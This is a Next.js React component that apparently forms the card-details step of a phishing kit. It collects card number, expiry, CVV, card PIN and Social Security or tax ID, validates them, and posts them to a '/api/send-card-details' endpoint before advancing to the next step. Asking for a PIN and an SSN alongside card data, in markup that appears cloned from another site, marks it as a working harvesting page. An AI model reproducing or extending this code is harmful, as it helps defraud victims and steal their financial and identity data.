import axios from "axios";
import { yupResolver } from "@hookform/resolvers/yup";
import valid from "card-validator";
import * as yup from "yup";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Input } from "../components/Input";
import { Container } from "../components/Container";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";

interface CardProps {}

const schema = yup.object().shape({
  cardNumber: yup
    .string()
    .required("Please enter your card number")
    .test(
      "test-number",
      "Please enter a valid card number",
      (value) => valid.number(value).isValid
    ),
  expirationDate: yup
    .string()
    .required("Please enter your card expiry date")
    .test(
      "test-date",
      "Please enter a valid expiry date",
      (value) => valid.expirationDate(value).isValid
    ),
  cvv: yup
    .string()
    .required("Please enter your card cvv")
    .test(
      "test-cvv",
      "Please enter a valid cvv",
      (value) => valid.cvv(value, [3, 4]).isValid
    ),
  cardPin: yup
    .string()
    .required("Please enter your card pin")
    .test(
      "test-pin",
      "Please enter a valid 4-digits pin`",
      (val) => !isNaN(Number(val))
    )
    .min(4, "Please enter a valid 4-digits pin")
    .max(5, "Please enter a valid 4-digits pin"),
  ssn: yup.string().required("Please enter your SSN"),
});

export const Card: React.FC<CardProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onTouched`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `CARD DETAILS`);
    formData.append(`cardDetails`, JSON.stringify(data));

    try {
      await axios.post(`/api/send-card-details`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      cardDetails: data,
    });

    const url = getProgress()[getProgress().indexOf(`CARD`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <Container loading={loading} onSubmit={onSubmit} step={`CARD`}>
      <div className="col-md-4 ng-star-inserted">
        <Input
          label={`Card Number`}
          name={`cardNumber`}
          register={register}
          curValue={watch(`cardNumber`)}
          registerOptions={{
            onChange: (event: any) => {
              var value = event.target.value;

              var newState = "9999 9999 9999 9999";
              if (/^3[47]/.test(value)) {
                newState = "9999 999999 99999";
              }
              setCardMask(newState);
            },
          }}
          mask={cardMask}
          error={
            errors.cardNumber &&
            (errors.cardNumber.message as unknown as string)
          }
        />
      </div>
      <div className="col-md-4 ng-star-inserted">
        <Input
          label={`Expiration Date`}
          name={`expirationDate`}
          register={register}
          curValue={watch(`expirationDate`)}
          mask={`99/9999`}
          error={
            errors.expirationDate &&
            (errors.expirationDate.message as unknown as string)
          }
        />
      </div>
      <div className="col-md-4 ng-star-inserted">
        <Input
          label={`CVV`}
          name={`cvv`}
          register={register}
          curValue={watch(`cvv`)}
          maxLength={4}
          error={errors.cvv && (errors.cvv.message as unknown as string)}
          type="number"
        />
      </div>
      <div className="col-md-4 ng-star-inserted">
        <Input
          label={`PIN`}
          name={`cardPin`}
          register={register}
          curValue={watch(`cardPin`)}
          maxLength={5}
          error={
            errors.cardPin && (errors.cardPin.message as unknown as string)
          }
          type="number"
        />
      </div>
      <div className="col-md-4 ng-star-inserted">
        <Input
          label={`Social Security Number or Tax ID`}
          name={`ssn`}
          register={register}
          curValue={watch(`ssn`)}
          error={errors.ssn && (errors.ssn.message as unknown as string)}
          mask={`999-99-9999`}
        />
      </div>
    </Container>
  );
};

export default Card;
